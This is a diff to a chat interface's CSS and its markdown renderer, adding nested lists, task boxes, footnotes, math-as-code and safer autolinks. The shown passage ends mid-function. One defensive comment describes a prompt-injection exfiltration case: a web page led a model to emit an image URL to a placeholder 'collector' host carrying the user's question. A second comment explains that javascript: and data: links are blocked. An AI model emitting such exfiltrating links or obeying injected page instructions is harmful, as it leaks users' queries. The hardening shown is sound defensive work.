@@ -50658,6 +50658,28 @@ body.painting #hero h1 .halo{animation:neonCatchGlow 1s 2.75s both}
 .body a{color:var(--accent-hot);text-decoration:none;
   border-bottom:1px solid rgba(255,255,255,.22)}
 .body a:hover{border-bottom-color:currentColor}
+/* ==== markdown, properly (6b623): Classic ==== */
+/* the pieces the renderer now builds, given sane Classic defaults: h4-h6, loose items' paragraphs, a quote's last
+   block, task boxes, strike, footnotes, math as code, aligned cells, and a long URL that wraps instead of widening */
+.body h4,.body h5,.body h6{font-family:var(--helv);font-weight:600;color:var(--text);line-height:1.35;margin:1.5em 0 .5em;font-size:13px}
+.body h5,.body h6{font-size:12px;color:var(--dim)}
+.body>h4:first-child,.body>h5:first-child,.body>h6:first-child{margin-top:0}
+.body li>p{margin:0 0 .6em}
+.body li>p:last-child,.body blockquote>:last-child{margin-bottom:0}
+.body li.task{list-style:none;position:relative}
+.body .tbox{position:absolute;left:-1.3em;top:.32em;width:12px;height:12px;box-sizing:border-box;border:1px solid var(--faint);border-radius:3px}
+.body .tbox.on{background:var(--text);border-color:var(--text)}
+.body .tbox.on::after{content:"";position:absolute;left:3.5px;top:1px;width:3px;height:6px;border:solid #0b0c10;border-width:0 1.5px 1.5px 0;transform:rotate(45deg)}
+.body del{color:var(--dim)}
+.body sup.fnref{font-size:.7em;line-height:1;vertical-align:.5em;color:var(--dim);margin-left:1px;cursor:pointer}
+.body .fnotes{margin:1.6em 0 0;padding-top:.8em;border-top:1px solid var(--line-soft);font-size:.88em;color:var(--dim)}
+.body .fnotes ol{margin:0}
+.body .mathblock{margin:0 0 1.05em;padding:10px 14px;border:1px solid rgba(255,255,255,.10);border-radius:var(--radius);background:rgba(8,9,12,.32);overflow-x:auto}
+.body .mathblock code{display:block;background:none;border:0;padding:0;white-space:pre;color:var(--text)}
+.body .ta-r{text-align:right}
+.body .ta-c{text-align:center}
+.msg.ai .body{overflow-wrap:break-word}
+.body a{overflow-wrap:anywhere}
 .body details{
   border:1px solid rgba(255,255,255,.09);border-radius:8px;
   margin:0 0 10px;background:rgba(8,9,12,.32);
@@ -54734,6 +54756,45 @@ html.tl:not(.tl-fs).hz #main:not(:has(#hero)) #chat-scroll.scrolled.fn-stuck{-we
   .hz .hz-fn .hz-stage .fopt{transition:none}
   .hz .hz-fn .hz-stage .fopt:not(:disabled):hover{transform:none}}
 /* ==== the Code lane and Funnels (6b622): end ==== */
+/* ==== markdown, properly (6b623): begin ==== */
+/* (per Patrick: "I want this UI to be perfect"; the audit's P0: nested lists, numbering, h4-h6, tasks, strike,
+   footnotes, quotes holding lists, bare URLs, math). In the reading's own terms (15 on 1.6, Inter, hairlines, the
+   8 px grid): lists 24 px a level, the numbers mono 12, tabular, right-aligned in their gutter and read from data-n
+   (so <ol start> and a source's own jump hold: the counter can't see them); a loose item's paragraphs 8 apart; task
+   boxes drawn in hairline, the done one filled silver with a dark tick, never an emoji; ~~strike~~ in a quieter ink;
+   footnote refs in the reading font (citations are mono), the notes under a hairline at 13; math as code until there
+   is a renderer (inline as code, display as a code card); a long URL or word wraps instead of widening the column */
+.hz .msg.ai .body{overflow-wrap:break-word}
+.hz .msg.ai .body a{overflow-wrap:anywhere}
+.hz .msg.ai .body h4{font-size:15px;font-weight:600;line-height:1.5;letter-spacing:-.005em;color:#fff;margin:1.2em 0 .4em}
+.hz .msg.ai .body h5,.hz .msg.ai .body h6{font-family:var(--hz-font-ui);font-size:13px;font-weight:600;line-height:1.5;letter-spacing:0;color:rgba(255,255,255,.72);margin:1.2em 0 .4em}
+.hz .msg.ai .body h6{color:rgba(255,255,255,.6)}
+.hz .msg.ai .body>h4:first-child,.hz .msg.ai .body>h5:first-child,.hz .msg.ai .body>h6:first-child{margin-top:0}
+.hz .msg.ai .body ul,.hz .msg.ai .body ol{padding-left:24px}
+.hz .msg.ai .body ol>li::before{left:-24px;width:20px}
+.hz .msg.ai .body ol>li[data-n]::before{content:attr(data-n)}
+.hz .msg.ai .body ul ul{list-style-type:disc}
+.hz .msg.ai .body ul ul li::marker{color:rgba(255,255,255,.4);font-size:.85em}
+.hz .msg.ai .body li>p{margin:0 0 8px}
+.hz .msg.ai .body li>p:last-child,.hz .msg.ai .body blockquote>:last-child{margin-bottom:0}
+.hz .msg.ai .body blockquote{margin:0 0 .8em}
+.hz .msg.ai .body li.task{list-style:none;position:relative}
+.hz .msg.ai .body .tbox{position:absolute;left:-22px;top:5px;width:14px;height:14px;box-sizing:border-box;border:1px solid rgba(255,255,255,.42);border-radius:3px}
+.hz .msg.ai .body .tbox.on{background:rgba(255,255,255,.88);border-color:rgba(255,255,255,.88)}
+.hz .msg.ai .body .tbox.on::after{content:"";position:absolute;left:4px;top:1px;width:3.5px;height:7px;border:solid #111214;border-width:0 1.5px 1.5px 0;transform:rotate(45deg)}
+.hz .msg.ai .body del{color:rgba(255,255,255,.58);text-decoration-thickness:1px;text-decoration-color:rgba(255,255,255,.45)}
+.hz .msg.ai .body sup.fnref{font:500 10.5px/1 var(--hz-font-read);font-variant-numeric:tabular-nums;color:rgba(255,255,255,.62);vertical-align:.5em;margin:0 0 0 1px;padding:0 1px;cursor:pointer}
+.hz .msg.ai .body sup.fnref:hover{color:#fff}
+.hz .msg.ai .body .fnotes{margin:24px 0 0;padding:16px 0 0;border-top:1px solid var(--hz-hair);font-size:13px;line-height:1.55;color:rgba(255,255,255,.66)}
+.hz .msg.ai .body .fnotes ol{margin:0}
+.hz .msg.ai .body .fnotes li{margin:0 0 4px}
+.hz .msg.ai .body .fnotes ol>li::before{font-size:11px;line-height:1.55;top:.15em}
+.hz .msg.ai .body code.math{font-style:normal}
+.hz .msg.ai .body .mathblock{margin:0 0 16px;padding:14px 16px;border-radius:8px;background:rgba(4,7,18,.55);border:1px solid var(--hz-hair-2);overflow-x:auto}
+.hz .msg.ai .body .mathblock code{display:block;font-size:13px;line-height:1.6;color:var(--hz-ink);background:none;border:0;padding:0;border-radius:0;white-space:pre}
+.hz .msg.ai .body .ta-r{text-align:right}
+.hz .msg.ai .body .ta-c{text-align:center}
+/* ==== markdown, properly (6b623): end ==== */
 /* ============================================================ HORIZON end */
 
 /* ==== bring your chats (6b529): styles begin ==== */
@@ -57883,13 +57944,88 @@ new MutationObserver(ms=>{
 }).observe(document.documentElement,{childList:true,subtree:true});
 
 function renderMD(raw){
-  // pull out think blocks first (DeepSeek R1)
+  // pull out think blocks first (DeepSeek R1); each stands on its own lines (6b623), so it is a block and never
+  // a paragraph's first words
   let thinks=[];
-  raw=raw.replace(/<think>([\s\S]*?)<\/think>/g,(_,t)=>{thinks.push(t.trim());return "\u0000THINK"+(thinks.length-1)+"\u0000";});
+  raw=raw.replace(/<think>([\s\S]*?)<\/think>/g,(_,t)=>{thinks.push(t.trim());return "\n\n\u0000THINK"+(thinks.length-1)+"\u0000\n\n";});
   const openThink=/<think>([\s\S]*)$/.exec(raw);
-  if(openThink){thinks.push(openThink[1].trim());raw=raw.replace(/<think>[\s\S]*$/,"\u0000THINKOPEN"+(thinks.length-1)+"\u0000");}
+  if(openThink){thinks.push(openThink[1].trim());raw=raw.replace(/<think>[\s\S]*$/,"\n\n\u0000THINKOPEN"+(thinks.length-1)+"\u0000");}
 
   let s=esc(raw);
+  /* MARKDOWN AS MODELS WRITE IT (6b623, per Patrick: "I want this UI to be perfect"). The audit found nested lists as
+     raw text, numbering that restarted ("10." became 2), h4-h6, task lists, ~~strike~~, footnotes, _italic_ inside
+     bold and lists inside quotes all raw, bare URLs unlinked and widening the column, $math$ raw. The text is still
+     escaped first and every rule below works on escaped text, so no tag the model writes ever reaches the page: the
+     only markup is what these rules build. The tokens (download and video boxes, the annotate card, code cards, the
+     think blocks) are stashed as before; the blocks are a line parser (blocks, below) with a nesting stack for lists
+     and quotes; the inline rules (inl) run on each leaf alone: code, math, escapes, links, URLs, footnotes,
+     citations, then emphasis, each finished piece held aside (keep) so a later rule can't reach into it. */
+  const pend=[];
+  const keep=h=>"\u0000k"+(pend.push(h)-1)+"\u0000";
+  const unkeep=t=>{for(let k=0;k<4&&t.indexOf("\u0000k")>=0;k++)t=t.replace(/\u0000k(\d+)\u0000/g,(_,i)=>pend[+i]);return t;};
+  const aOut=(u,t)=>'<a href="'+u+'" target="_blank" rel="noopener noreferrer">'+t+"</a>";
+  // footnotes: [^x] is a small superscript numbered in the order the refs appear; [^x]: lines are the notes,
+  // listed at the end. Never a citation chip (those are [1], the sources row's numbers).
+  const fnIdx=new Map(),fnDefs=new Map();
+  const fnNum=k=>{k=k.toLowerCase();if(!fnIdx.has(k))fnIdx.set(k,fnIdx.size+1);return fnIdx.get(k);};
+  const emph=t=>t
+    .replace(/~~(?=\S)([^~\n]*?\S)~~/g,"<del>$1</del>")
+    .replace(/\*\*\*(?=\S)([^*\n]*?\S)\*\*\*/g,"<strong><em>$1</em></strong>")
+    .replace(/\*\*(?=\S)((?:[^*]|\*(?!\*))*?\S)\*\*/g,"<strong>$1</strong>")
+    .replace(/(^|[^\w_])__(?=\S)((?:[^_]|_(?!_))*?\s(?:[^_]|_(?!_))*?\S)__(?![\w_])/g,"$1<strong>$2</strong>")   // __two words__; __init__ stays a name
+    // italics: a * or _ never opens inside a word (snake_case_names, 2*3*4) and never next to a space
+    .replace(/(^|[^\w*])\*(?=[^\s*])([^*\n]*?[^\s*])\*(?![\w*])/g,"$1<em>$2</em>")
+    .replace(/(^|[^\w_])_(?=[^\s_])([^_\n]*?[^\s_])_(?![\w_])/g,"$1<em>$2</em>");
+  const math=b=>keep('<code class="math">'+b+"</code>");
+  const inl=t=>{
+    // inline code first: nothing inside it is markdown (arr[1] is an index, $HOME a variable)
+    t=t.replace(/``(?!`)([^\n]*?[^`\n])``(?!`)/g,(_,c)=>keep("<code>"+c.trim()+"</code>"));
+    t=t.replace(/`([^`\n]+)`/g,(_,c)=>keep("<code>"+c+"</code>"));
+    // MATH, AS CODE FOR NOW (no KaTeX: downloads are not approved). $$x$$, \(x\) and $x$; a dollar amount is
+    // never math: the opening $ sits against its first character, the closing $ against its last and before no
+    // letter or digit, and a span that starts with a digit needs a math sign in it ("$5 and $10" stays money)
+    t=t.replace(/\$\$(?=\S)([^$\n]*?\S)\$\$/g,(_,b)=>math(b));
+    t=t.replace(/\\\((?=\S)([^\n]*?\S)\\\)/g,(_,b)=>math(b));
+    t=t.replace(/(^|[^\\$\w])\$(?=[^\s$])((?:\\\$|[^$\n])*?[^\s\\$])\$(?![\w$])/g,(m,p,b)=>
+      /^\d/.test(b)&&!/[\\^_=+{}]|&[lg]t;/.test(b)?m:p+math(b));
+    // a backslash keeps a markdown character as itself (\*, \_, \|, \$ ...)
+    t=t.replace(/\\([\\`*_{}\[\]()#+\-.!|~$])/g,(_,c)=>keep(c));
+    // markdown links: research briefs cite their sources this way. Only http(s) is allowed through, so a model
+    // cannot emit javascript: or data:
+    // generated pictures (6b294): OUR OWN /api/image/ files only (6b310).
+    // A remote picture loads with no click, so an answer that a web page
+    // talked into ![](https://collector/?q=<your question>) sent the
+    // question out the moment it rendered. A remote one is a link now.
+    // No src (6b321): data-api-src, which api() turns into a blob: URL,
+    // since an <img> can't carry the token
+    t=t.replace(/!\[([^\]\n]*)\]\((\/api\/image\/[\w.-]+)\)/g,
+      (_,a,u)=>keep('<img class="genimg" data-api-src="'+u+'" alt="'+a+'">'));
+    t=t.replace(/!\[([^\]\n]*)\]\((https?:\/\/[^\s)]+)\)/g,(_,a,u)=>keep(aOut(u,a||"image")));
+    t=t.replace(/\[([^\]\n]+)\]\((https?:\/\/(?:[^\s()]|\([^\s()]*\))+)\)/g,(_,x,u)=>keep(aOut(u,emph(x))));
+    // AUTOLINKS: <https://...> and a bare http(s) URL. The URL is escaped text that stops at a space, a quote or
+    // any entity but &amp;, so it can't leave its attribute; trailing punctuation and an unmatched ) stay prose
+    t=t.replace(/&lt;(https?:\/\/(?:[^\s&]|&amp;)+?)&gt;/g,(_,u)=>keep(aOut(u,u)));
+    t=t.replace(/(^|[^\w\/=\u0000])(https?:\/\/(?:[^\s&\u0000]|&amp;)+)/g,(m,p,u)=>{
+      let tail="";
+      for(;;){
+        const c=u[u.length-1];
+        if(/[.,;:!?*_~\]]/.test(c)||(c===")"&&u.split("(").length<u.split(")").length)){tail=c+tail;u=u.slice(0,-1);}
+        else if(/&amp;$/.test(u)){tail="&amp;"+tail;u=u.slice(0,-5);}
+        else break;
+      }
+      return /^https?:\/\/[^\/]/.test(u)?p+keep(aOut(u,u))+tail:m;
+    });
+    t=t.replace(/\[\^([^\]\s]{1,40})\]/g,(_,k)=>{const n=fnNum(k);
+      return keep('<sup class="fnref" data-fn="'+n+'" title="Note '+n+'">'+n+"</sup>");});
+    // CITATIONS (6b514): a grounded answer marks each fact with its source
+    // number, [2] or [1][3] or [1, 3]. Each becomes a small chip that opens
+    // that source (the message's own source chips, in order; the delegated
+    // handler beside the chevron's). Never a markdown link's [text](url),
+    // never inside code (arr[1] is an index): both are held aside by now.
+    t=t.replace(/\[(\d{1,2}(?:\s*,\s*\d{1,2})*)\](?!\()/g,(_,ns)=>keep(ns.split(/\s*,\s*/)
+      .map(n=>'<sup class="cite" data-n="'+n+'" title="source '+n+'">'+n+'</sup>').join("")));
+    return unkeep(emph(t));
+  };
   // PIPE TABLES, ONE BUILDER FOR BOTH WAYS IN (6b425, per Patrick: "We're
   // getting these boxes at the bottom of results again that have no
   // purpose. It's like it's trying to do the top of a chart, but there is
@@ -57900,19 +58036,23 @@ function renderMD(raw){
   // fewer than two rows that say anything left, the cells are one line
   // joined by " · " (nothing at all when every cell is empty); a blank
   // header over real rows is a table with no head. Rows that lost their
-  // closing pipe still count as rows.
-  const tCells=r=>r.replace(/^\||\|$/g,"").split("|").map(c=>c.trim());
+  // closing pipe still count as rows. (6b623) A cell's \| (or a | in `code`) is a pipe, not a
+  // border; each cell gets the inline rules; :--: and --: align a column.
+  const tCells=r=>r.replace(/\\\|/g,"\u0000P").replace(/`[^`\n]*`/g,c=>c.replace(/\|/g,"\u0000Q")).replace(/^\||\|$/g,"").split("|")
+    .map(c=>c.trim().replace(/\u0000P/g,"\\|").replace(/\u0000Q/g,"|"));
   const tDiv=r=>/^\|[\s:|-]*-[\s:|-]*\|?$/.test(r);
   const tBuild=rows=>{
     const head=tCells(rows[0]),hasHead=head.some(c=>c);
+    const al=tCells(rows[1]||"").map(c=>/^:-*:$/.test(c)?' class="ta-c"':/^-*:$/.test(c)?' class="ta-r"':"");
+    const cell=(tg,c,k)=>"<"+tg+(al[k]||"")+">"+inl(c)+"</"+tg+">";
     const body=rows.slice(2).filter(r=>!tDiv(r)).map(tCells)
       .filter(cs=>cs.some(c=>c));
     const all=(hasHead?[head]:[]).concat(body);
     if(all.length<2)
-      return all.length?"<p>"+all[0].filter(c=>c).join(" · ")+"</p>":"";
+      return all.length?"<p>"+all[0].filter(c=>c).map(inl).join(" · ")+"</p>":"";
     return "<table>"+(hasHead?"<thead><tr>"
-        +head.map(c=>"<th>"+c+"</th>").join("")+"</tr></thead>":"")
-      +"<tbody>"+body.map(cs=>"<tr>"+cs.map(c=>"<td>"+c+"</td>").join("")
+        +head.map((c,k)=>cell("th",c,k)).join("")+"</tr></thead>":"")
+      +"<tbody>"+body.map(cs=>"<tr>"+cs.map((c,k)=>cell("td",c,k)).join("")
         +"</tr>").join("")+"</tbody></table>";
   };
   // the download box (6b295): stashed as a placeholder the instant the
@@ -57944,9 +58084,16 @@ function renderMD(raw){
   // still streaming in. That distinction drives the copy button
   // (6b244, per Patrick): greyed while open, live once the fence lands.
   // renderMD re-runs on every chunk, so the flip needs no state at all.
-  s=s.replace(/```(\w*)\n?([\s\S]*?)(```|$)/g,(_,lang,code,close)=>{
+  s=s.replace(/```(\w*)\n?([\s\S]*?)(```|$)/g,(_,lang,code,close,at,all)=>{
+    // A FENCE INSIDE A LIST ITEM OR A QUOTE (6b623): only spaces (or > marks) before it on its line, so its lines
+    // lose that margin and the card stays in its item, on that line, with no blank lines around it
+    const pre=all.slice(all.lastIndexOf("\n",at-1)+1,at);
+    const nest=pre!==""&&/^[ \t]*(?:&gt;[ \t]*)*$/.test(pre);
+    if(nest){const ls=code.split("\n").map(x=>x.startsWith(pre)?x.slice(pre.length):x.replace(/^[ \t]*(?:&gt;[ \t]?)*[ \t]*/,""));
+      if(ls.length>1&&!ls[ls.length-1].trim())ls.pop();code=ls.join("\n");}
+    const card=h=>nest?"\u0000CC"+(ccs.push(h)-1)+"\u0000":stash(h);
     code=code.replace(/\n$/,"");
-    if(lang.toLowerCase()==="flow")return stash(flowDiagram(code));
+    if(lang.toLowerCase()==="flow")return card(flowDiagram(code));
     if(lang.toLowerCase()==="annotate"){
       // stashed like the download box: no inline rule may reach the attribute
       const ah=annSlot(code,close);
@@ -57957,15 +58104,16 @@ function renderMD(raw){
     // as mono soup with $7 highlighted as a number token)
     if(!lang||/^(md|markdown|te?xt|table)$/i.test(lang)){
       const tl=code.trim().split(/\n/).map(l=>l.trim());
-      if(tl.length>=2&&tl.every(l=>/^\|/.test(l))&&tDiv(tl[1]))
-        return "\n\n"+tBuild(tl)+"\n\n";
+      if(tl.length>=2&&tl.every(l=>/^\|/.test(l))&&tDiv(tl[1])){
+        if(nest)return card(tBuild(tl));
+        return "\n\n"+tBuild(tl)+"\n\n";}
     }
     // every card carries the bar now — the copy button needs a home
     // even when the model named no language
     // the gutter (6b528): line numbers as a sibling of the code, shown by the
     // "lines" switch on the bar; the copy button still reads pre code alone
     const nl=code.split("\n").length;
-    return stash('<div class="codecard">'
+    return card('<div class="codecard">'
       +'<div class="codebar"><span>'+esc(lang||"code")+'</span>'
       +'<button class="cbtn lines" type="button" title="Line numbers">lines</button>'
       +(close
@@ -57975,75 +58123,128 @@ function renderMD(raw){
       +'<pre><span class="gut" aria-hidden="true">'+Array.from({length:nl},(_,i)=>i+1).join("\n")+'</span>'
       +"<code>"+hilite(code,lang)+"</code></pre></div>");
   });
-  // inline code, bold, italics, headings
-  s=s.replace(/`([^`\n]+)`/g,"<code>$1</code>");
-  s=s.replace(/\*\*([^*]+)\*\*/g,"<strong>$1</strong>");
-  s=s.replace(/(^|[\s(])\*([^*\n]+)\*(?=[\s).,!?:;]|$)/g,"$1<em>$2</em>");
-  s=s.replace(/^### (.*)$/gm,"<h3>$1</h3>").replace(/^## (.*)$/gm,"<h2>$1</h2>").replace(/^# (.*)$/gm,"<h1>$1</h1>");
-  // markdown links — research briefs cite their sources this way. Only
-  // http(s) is allowed through, so a model cannot emit javascript: or data:
-  // generated pictures (6b294): OUR OWN /api/image/ files only (6b310).
-  // A remote picture loads with no click, so an answer that a web page
-  // talked into ![](https://collector/?q=<your question>) sent the
-  // question out the moment it rendered. A remote one is a link now.
-  // No src (6b321): data-api-src, which api() turns into a blob: URL,
-  // since an <img> can't carry the token
-  s=s.replace(/!\[([^\]\n]*)\]\((\/api\/image\/[\w.-]+)\)/g,
-    (_,a,u)=>'<img class="genimg" data-api-src="'+u+'" alt="'+a+'">');
-  s=s.replace(/!\[([^\]\n]*)\]\((https?:\/\/[^\s)]+)\)/g,
-    (_,a,u)=>'<a href="'+u+'" target="_blank" rel="noopener noreferrer">'
-      +(a||"image")+"</a>");
-  s=s.replace(/\[([^\]\n]+)\]\((https?:\/\/[^\s)]+)\)/g,
-    (_,t,u)=>'<a href="'+u+'" target="_blank" rel="noopener noreferrer">'+t+"</a>");
-  // CITATIONS (6b514): a grounded answer marks each fact with its source
-  // number, [2] or [1][3] or [1, 3]. Each becomes a small chip that opens
-  // that source (the message's own source chips, in order; the delegated
-  // handler beside the chevron's). Never a markdown link's [text](url),
-  // never inside code (arr[1] is an index).
-  s=s.split(/(<code>[\s\S]*?<\/code>)/).map((seg,k)=>k%2?seg:seg.replace(
-    /\[(\d{1,2}(?:\s*,\s*\d{1,2})*)\](?!\()/g,(_,ns)=>ns.split(/\s*,\s*/)
-    .map(n=>'<sup class="cite" data-n="'+n+'" title="source '+n+'">'+n+'</sup>').join(""))).join("");
-  // PIPE TABLES — models reach for them constantly and they used to
-  // render as raw pipes
-  // a header and a divider with no rows under them (small models end an answer
-  // with one, 6b349, per Patrick: "why does it ... keep showing that grid along
-  // the bottom?") is a line of its cells, not an empty grid: tBuild above.
-  // Every line that starts with a pipe belongs to the block (6b425), so a
-  // row missing its closing pipe is a row, not stray text under a header.
-  // The block stands as its own paragraph, so no <p> wraps a <table> or <p>.
-  s=s.replace(/(^|\n)((?:\|[^\n]*(?:\n|$)){2,})/g,(m,pre,block)=>{
-    const rows=block.trim().split(/\n/).map(r=>r.trim());
-    if(!tDiv(rows[1]||""))return m;   // needs a divider
-    return pre+(pre?"\n":"")+tBuild(rows)+(/\n$/.test(block)?"\n\n":"");
-  });
-  // setext headers FIRST (small models love them: text over ----- /
-  // =====) or the underline renders as a stray <hr> after plain text
-  s=s.replace(/(^|\n)([^\n]{1,90})\n={3,}[ \t]*(?=\n|$)/g,"$1<h1>$2</h1>");
-  s=s.replace(/(^|\n)([^\n]{1,90})\n-{3,}[ \t]*(?=\n|$)/g,"$1<h2>$2</h2>");
-  // horizontal rules and block quotes
-  s=s.replace(/(^|\n)(?:---|\*\*\*|___)[ \t]*(?=\n|$)/g,"$1<hr>");
-  s=s.replace(/(^|\n)((?:&gt; ?.*(?:\n|$))+)/g,(m,pre,block)=>
-    pre+"<blockquote>"+block.trim().split(/\n/)
-      .map(l=>l.replace(/^&gt; ?/,"")).join("<br>")+"</blockquote>");
-  // lists — bulleted and numbered
-  s=s.replace(/(^|\n)((?:[-*] .*(?:\n|$))+)/g,(m,pre,block)=>{
-    const items=block.trim().split(/\n/).map(l=>"<li>"+l.replace(/^[-*] /,"")+"</li>").join("");
-    return pre+"<ul>"+items+"</ul>";
-  });
-  s=s.replace(/(^|\n)((?:\d+[.)] .*(?:\n|$)){2,})/g,(m,pre,block)=>{
-    const items=block.trim().split(/\n/).map(l=>"<li>"+l.replace(/^\d+[.)] /,"")+"</li>").join("");
-    return pre+"<ol>"+items+"</ol>";
-  });
-  s=s.replace(/(^|\n)((?:\d+\. .*(?:\n|$))+)/g,(m,pre,block)=>{
-    const items=block.trim().split(/\n/).map(l=>"<li>"+l.replace(/^\d+\. /,"")+"</li>").join("");
-    return pre+"<ol>"+items+"</ol>";
-  });
-  // paragraphs
-  s=s.split(/\n{2,}/).map(p=>{
-    if(!p.trim())return "";   // a table's own blank lines make no empty <p>
-    if(/^<(pre|ul|ol|h\d|details|table|blockquote|hr|p>)|^\u0000CC\d+\u0000$/.test(p.trim()))return p;
-    return "<p>"+p.replace(/\n/g,"<br>")+"</p>";
-  }).join("");
+  /* THE BLOCKS (6b623). One line at a time: a heading (# to ######), a rule, a quote (its lines lose their > and are
+     parsed again, so a quote holds lists, paragraphs and code), a list, display math, a footnote's note, a table or a
+     token on its own line, else a paragraph (its lines joined by <br>, as before; a line of === or --- under one line
+     makes it a heading). LISTS: a stack by indentation. An item takes every line indented past its marker (2 to 4
+     spaces or a tab nest, as models write them), lines that just carry on its last paragraph (lazy) and blank lines
+     followed by more of it; its lines are parsed again, so lists nest to any depth, bullets and numbers mixed, with
+     code and quotes inside. A blank line between items or between an item's blocks makes the list loose (paragraphs);
+     otherwise it is tight. A numbered list starts at its first number (<ol start>, so a list cut by a paragraph or a
+     code card carries on: 3, 4 ...); "1. 1. 1." counts 1, 2, 3 and a jump the source makes (2 then 10) is kept. Each
+     number is also data-n, which Horizon's numbers read (their counter can't see start or value). */
+  const LI=/^( *)([-*+•]|\d{1,9}[.)])(?:([ \t]+)(.*)|[ \t]*$)/;
+  const isHr=l=>/^ {0,3}([-*_])(?:[ \t]*\1){2,}[ \t]*$/.test(l);
+  const isHd=l=>/^ {0,3}#{1,6}(?:[ \t]|$)/.test(l);
+  const isQ=l=>/^ {0,3}&gt;/.test(l);
+  const isRaw=l=>/^[ \t]*(?:<(?:table|p)>|\u0000(?:CC|AN|DL|VD|THINK|THINKOPEN)\d+\u0000[ \t]*$)/.test(l);
+  const isMath=l=>/^ {0,3}(?:\$\$[ \t]*$|\$\$.*\S.*\$\$[ \t]*$|\$\$(?!.*\$\$)[^\s\d$]|\\\[[ \t]*$|\\\[.*\\\][ \t]*$)/.test(l);
+  const isFn=l=>/^ {0,3}\[\^[^\]\s]{1,40}\]:/.test(l);
+  const isSetext=l=>/^ {0,3}(?:={3,}|-{3,})[ \t]*$/.test(l);
+  const starts=l=>isHd(l)||isHr(l)||isQ(l)||LI.test(l)||isRaw(l)||isMath(l)||isFn(l);
+  const lazyOK=l=>!!l.trim()&&!isRaw(l)&&!isHd(l)&&!isHr(l)&&!isMath(l)&&!isFn(l);
+  // an item's paragraphs are marked, and the list decides at its end: <p> when loose, bare when tight
+  const P0="\u0000P(",P1="\u0000P)";
+  const tbox=on=>'<span class="tbox'+(on?" on":"")+'" role="checkbox" aria-checked="'+on+'" aria-disabled="true" aria-label="'+(on?"Done":"Not done")+'"></span>';
+  const list=(L,i)=>{
+    const ord=/\d/.test(LI.exec(L[i])[2]),its=[];
+    let loose=false,start=1,prev=0;
+    while(i<L.length){
+      const m=LI.exec(L[i]);
+      if(!m||/\d/.test(m[2])!==ord||isHr(L[i]))break;
+      const ind=m[1].length,body=m[4]===undefined?"":m[4],sp=m[3]?m[3].length:1;
+      const co=ind+m[2].length+(body&&sp<=4?sp:1),th=Math.min(co,ind+2);
+      const lines=[body];i++;
+      while(i<L.length){
+        const x=L[i];
+        if(!x.trim()){lines.push("");i++;continue;}
+        const xi=x.length-x.replace(/^ +/,"").length;
+        if(xi>=th){lines.push(x.slice(Math.min(xi,co)));i++;continue;}
+        if(lines[lines.length-1]!==""&&lazyOK(lines[lines.length-1])&&!starts(x)&&!isSetext(x)){lines.push(x.trim());i++;continue;}
+        break;
+      }
+      let tb=0;while(lines.length>1&&lines[lines.length-1]===""){lines.pop();tb++;}
+      i-=tb;
+      let n=0;
+      if(ord){const sn=parseInt(m[2],10);n=its.length?(sn>prev?sn:prev+1):sn;if(!its.length)start=n;}
+      const jump=ord&&its.length&&n!==prev+1;prev=n;
+      let task=null;const tm=/^\[([ xX])\](?:[ \t]+|$)/.exec(lines[0]);
+      if(tm){task=tm[1]!==" ";lines[0]=lines[0].slice(tm[0].length);}
+      const r=blocks(lines.join("\n"),true);
+      if(r.gap)loose=true;
+      its.push("<li"+(task!==null?' class="task"':"")+(ord?' data-n="'+n+'"'+(jump?' value="'+n+'"':""):"")+">"
+        +(task!==null?tbox(task):"")+r.h+"</li>");
+      // blank lines then another item of this list: the list goes on, loose; anything else ends it
+      let j=i;while(j<L.length&&!L[j].trim())j++;
+      if(j>i){const nm=j<L.length&&LI.exec(L[j]);
+        if(nm&&/\d/.test(nm[2])===ord&&!isHr(L[j])){loose=true;i=j;}else break;}
+    }
+    const h=its.join("").split(P0).join(loose?"<p>":"").split(P1).join(loose?"</p>":"");
+    return {h:(ord?"<ol"+(start!==1?' start="'+start+'"':"")+">":"<ul>")+h+(ord?"</ol>":"</ul>"),i:i};
+  };
+  const blocks=(src,item)=>{
+    let s=src;
+    // PIPE TABLES — models reach for them constantly and they used to
+    // render as raw pipes
+    // a header and a divider with no rows under them (small models end an answer
+    // with one, 6b349, per Patrick: "why does it ... keep showing that grid along
+    // the bottom?") is a line of its cells, not an empty grid: tBuild above.
+    // Every line that starts with a pipe belongs to the block (6b425), so a
+    // row missing its closing pipe is a row, not stray text under a header.
+    // The block stands as its own paragraph, so no <p> wraps a <table> or <p>.
+    // (6b623) It runs at every depth, so a table in a list item or a quote is a table.
+    s=s.replace(/(^|\n)((?:\|[^\n]*(?:\n|$)){2,})/g,(m,pre,block)=>{
+      const rows=block.trim().split(/\n/).map(r=>r.trim());
+      if(!tDiv(rows[1]||""))return m;   // needs a divider
+      return pre+(pre?"\n":"")+tBuild(rows)+(/\n$/.test(block)?"\n\n":"");
+    });
+    const L=s.split("\n").map(l=>l.replace(/^[ \t]+/,w=>w.replace(/\t/g,"    ")));
+    const out=[];let i=0,gap=false,blank=false;
+    const push=h=>{if(out.length&&blank)gap=true;blank=false;out.push(h);};
+    const para=p=>{const h=inl(p.join("\n")).replace(/\n/g,"<br>");return item?P0+h+P1:"<p>"+h+"</p>";};
+    while(i<L.length){
+      const l=L[i];let m;
+      if(!l.trim()){blank=true;i++;continue;}
+      if(isRaw(l)){push(l.trim());i++;continue;}
+      if((m=/^ {0,3}(#{1,6})(?:[ \t]+(.*?))?(?:[ \t]+#+)?[ \t]*$/.exec(l))){
+        const k=m[1].length;push("<h"+k+">"+inl(m[2]||"")+"</h"+k+">");i++;continue;}
+      if(isHr(l)){push("<hr>");i++;continue;}
+      if(isQ(l)){
+        const q=[];
+        for(;i<L.length;i++){const x=L[i];
+          if(isQ(x))q.push(x.replace(/^ {0,3}&gt; ?/,""));
+          else if(q.length&&lazyOK(q[q.length-1])&&!starts(x)&&!isSetext(x))q.push(x);
+          else break;}
+        push("<blockquote>"+blocks(q.join("\n"),false).h+"</blockquote>");continue;}
+      if(LI.test(l)){const r=list(L,i);push(r.h);i=r.i;continue;}
+      if(isMath(l)){
+        const cl=/^ *\$\$/.test(l)?"$$":"\\]",parts=[];let rest=l.trim().slice(2);i++;
+        for(;;){const k=rest.indexOf(cl);if(k>=0){parts.push(rest.slice(0,k));break;}
+          parts.push(rest);if(i>=L.length)break;rest=L[i++];}
+        push('<div class="mathblock"><code class="math">'+parts.join("\n").trim()+"</code></div>");continue;}
+      if((m=/^ {0,3}\[\^([^\]\s]{1,40})\]:[ \t]*(.*)$/.exec(l))){
+        const k=m[1].toLowerCase(),note=[m[2]];i++;
